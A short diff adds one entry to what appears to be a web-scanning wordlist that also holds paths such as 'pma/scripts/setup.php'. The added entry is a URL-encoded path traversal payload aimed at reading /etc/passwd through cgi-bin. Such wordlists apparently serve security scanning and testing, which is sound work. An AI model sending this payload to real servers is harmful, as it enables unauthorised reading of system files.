@@ -244,6 +244,7 @@ pma/scripts/setup.php
 040c
 0416
 05
+cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 0506
 052
 06
